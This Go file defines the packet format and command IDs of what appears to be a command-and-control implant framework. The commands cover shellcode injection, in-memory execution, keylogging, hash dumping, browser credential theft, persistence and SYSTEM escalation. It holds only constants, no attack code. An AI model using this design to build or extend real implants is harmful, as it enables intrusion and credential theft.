package protocol

// Magic bytes for packet identification
var Magic = [4]byte{'W', 'I', 'S', 'P'}

// Packet types
const (
	TypeRegister    byte = 0x01 // Agent -> Server: initial registration
	TypeRegisterAck byte = 0x02 // Server -> Agent: registration confirmed
	TypeCheckin     byte = 0x03 // Agent -> Server: heartbeat / poll tasks
	TypeTask        byte = 0x04 // Server -> Agent: task assignment
	TypeResult      byte = 0x05 // Agent -> Server: task result
	TypeClose       byte = 0x06 // Both: connection close
	TypeRequestKey  byte = 0x07 // Agent -> Server: request the RSA public key
	TypeServerKey   byte = 0x08 // Server -> Agent: RSA public key PEM
)

// Command IDs for Agent tasks
const (
	CmdShell    uint32 = 1
	CmdLs       uint32 = 2
	CmdCd       uint32 = 3
	CmdCat      uint32 = 4
	CmdUpload   uint32 = 5
	CmdDownload uint32 = 6
	CmdPs       uint32 = 7
	CmdKillProc uint32 = 8
	CmdSysinfo  uint32 = 9
	CmdSleep    uint32 = 10
	CmdExit     uint32 = 11

	// File management (structured results for the File Explorer)
	CmdLsJSON   uint32 = 12 // structured directory listing
	CmdMkdir    uint32 = 13
	CmdRm       uint32 = 14
	CmdRename   uint32 = 15
	CmdExecFile uint32 = 16

	// Interactive shell (persistent process, stdin/stdout loop)
	CmdIshellOpen  uint32 = 17
	CmdIshellRun   uint32 = 18
	CmdIshellClose uint32 = 19

	// Remote desktop (screen capture stream + input injection)
	CmdRDPStart uint32 = 20
	CmdRDPStop  uint32 = 21
	CmdRDPInput uint32 = 22

	// Remote control: instruct the agent to connect to the RCP long-lived
	// channel (fast, sleep-independent screen stream + input).
	CmdRCPConnect    uint32 = 23
	CmdRCPDisconnect uint32 = 24

	// Single-frame screen capture (screenshot).
	CmdScreenshot uint32 = 25

	// Print working directory.
	CmdPwd uint32 = 26

	// Client / computer management.
	CmdClientKill   uint32 = 27 // terminate the agent process itself
	CmdHostReboot   uint32 = 28 // reboot the target computer
	CmdHostShutdown uint32 = 29 // shut down the target computer
	CmdHostLogoff   uint32 = 30 // log off the current user
	CmdHostLock     uint32 = 31 // lock the workstation (Windows)

	// Loader / post-exploitation commands (32+). All args are JSON; the agent
	// resolves the handler through its command registry so new capabilities can
	// be added without re-numbering the wire format.
	CmdExecShellcode   uint32 = 32 // run shellcode in the current process
	CmdInjectShellcode uint32 = 33 // inject shellcode into a remote process
	CmdSpawn           uint32 = 34 // fork-and-run: suspended child + inject + run
	CmdBOF             uint32 = 35 // execute a Beacon Object File (.o) in memory
	CmdExecuteAssembly uint32 = 36 // run a .NET assembly in-process
	CmdExecutePE       uint32 = 37 // run an EXE entirely from memory
	CmdJobList         uint32 = 38 // list async jobs
	CmdJobKill         uint32 = 39 // kill an async job
	CmdPortscan        uint32 = 40 // async network scan
	CmdSocks           uint32 = 41 // SOCKS5 proxy server (job)
	CmdPortfwd         uint32 = 42 // local/reverse port forward (job)
	CmdKeylog          uint32 = 43 // keyboard capture (job)
	CmdClipboard       uint32 = 44 // clipboard snapshot / monitor
	CmdTokenSteal      uint32 = 45 // duplicate a remote process token
	CmdTokenRevert     uint32 = 46 // revert to the process token
	CmdHashdump        uint32 = 47 // dump SAM/LSA hashes
	CmdBrowserCreds    uint32 = 48 // harvest saved browser credentials
	CmdPersist         uint32 = 49 // install persistence
	CmdNetEnum         uint32 = 50 // network enumeration helpers
	CmdGetSystem       uint32 = 51 // obtain SYSTEM via token manipulation
	CmdDiagSSN         uint32 = 52 // diagnostic: warm + report the SSN table only
)

// RCP (Remote Control Protocol) message types. These ride on a separate,
// long-lived TCP channel that is independent of the polling task loop.
const (
	TypeRCPHello byte = 0x10 // agent → server: agentID + RSA-encrypted challenge
	TypeRCPAck   byte = 0x11 // server → agent: challenge encrypted with session keys
	TypeRCPFrame byte = 0x12 // agent → server: screen frame
	TypeRCPInput byte = 0x13 // server → agent: mouse / keyboard input
	TypeRCPClose byte = 0x14 // either side: close the channel
	TypeRCPPing  byte = 0x15 // keepalive
	TypeRCPError byte = 0x16 // agent → server: stream error (e.g. capture failed)
)

// Session status
const (
	StatusAlive = "alive"
	StatusDead  = "dead"
)

// Listener status
const (
	ListenerRunning = "running"
	ListenerStopped = "stopped"
)

// Listener protocols
const (
	ProtocolTCP   = "tcp"
	ProtocolHTTP  = "http"
	ProtocolHTTPS = "https"
	ProtocolKCP   = "kcp"
	ProtocolQUIC  = "quic"
)

// Sleep/jitter boundaries shared by the agent, the payload generator and the
// CLI. Sleep has no upper limit; only a minimum is enforced so the agent does
// not busy-loop against the server. Jitter above 100% would make the effective
// interval negative (same busy-loop), so it is capped at 100%.
const (
	MinSleepMS   = 10
	MaxJitterPct = 100
)

// SupportedListenerProtocols returns the list of protocols that can be created.
func SupportedListenerProtocols() []string {
	return []string{ProtocolTCP, ProtocolHTTP, ProtocolHTTPS, ProtocolKCP, ProtocolQUIC}
}

// Task status
const (
	TaskPending     = "pending"
	TaskSent        = "sent"
	TaskCompleted   = "completed"
	TaskFailed      = "failed"
	TaskDownloading = "downloading"
	// TaskJobOutput marks a streaming output line from an async job. It is
	// relayed to the console without completing the owning task.
	TaskJobOutput = "job_output"
)

// HeaderSize is Magic(4) + Size(4) + Type(1)
const HeaderSize = 9

// MaxPacketSize limits maximum payload size (10MB)
const MaxPacketSize = 10 * 1024 * 1024
